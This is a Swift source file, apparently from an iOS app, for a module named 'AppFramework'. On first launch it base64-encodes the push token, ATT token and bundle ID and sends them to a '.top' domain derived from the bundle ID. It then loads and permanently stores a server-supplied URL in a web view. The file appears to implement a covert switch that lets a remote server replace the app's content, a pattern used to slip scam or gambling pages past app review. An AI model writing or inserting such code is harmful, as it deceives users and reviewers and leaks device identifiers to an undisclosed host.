import Foundation

extension AppFramework {
    private func formatDomain(from bundleId: String) -> String {
        let cleanBundleId = bundleId.replacingOccurrences(of: ".", with: "")
        print("AppFramework: Formatted domain: \(cleanBundleId).top")
        return "\(cleanBundleId).top"
    }
    
    internal func handleFirstLaunch() async {
        print("AppFramework: Handling first launch")
        let deviceData = await collectDeviceData()
        let queryString = formatQueryString(from: deviceData)
        print("AppFramework: Original query string: \(queryString)")
        
        let encodedData = queryString.data(using: .utf8)?.base64EncodedString() ?? ""
        print("AppFramework: Base64 encoded data: \(encodedData)")
        
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = formatDomain(from: bundleId)
        
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else {
            print("AppFramework: Failed to create URL")
            return
        }
        
        print("AppFramework: Sending request to: \(url)")
        
        do {
            let (data, response) = try await URLSession.shared.data(from: url)
            print("AppFramework: Server response status: \((response as? HTTPURLResponse)?.statusCode ?? 0)")
            
            if let responseURL = String(data: data, encoding: .utf8), !responseURL.isEmpty {
                print("AppFramework: Received URL: \(responseURL)")
                
                // Обработка URL
                let processedURL = processResponseURL(responseURL)
                print("AppFramework: Processed URL: \(processedURL)")
                
                DispatchQueue.main.async {
                    self.setWebViewURL(processedURL)
                    UserDefaults.standard.set(processedURL, forKey: "webViewURL")
                    NotificationCenter.default.post(name: .webViewShouldPresent, object: nil)
                }
            } else {
                print("AppFramework: Received empty response")
            }
            isFirstLaunch = false
        } catch {
            print("AppFramework: Network error: \(error)")
        }
    }
    
    private func processResponseURL(_ url: String) -> String {
        if url.hasPrefix("http://") || url.hasPrefix("https://") {
            return url
        } else {
            return "https://" + url
        }
    }
    
    private func formatQueryString(from data: [String: String]) -> String {
        return "apns_token=\(data["apns_token"] ?? "")&att_token=\(data["att_token"] ?? "")&bundle_id=\(data["bundle_id"] ?? "")"
    }
}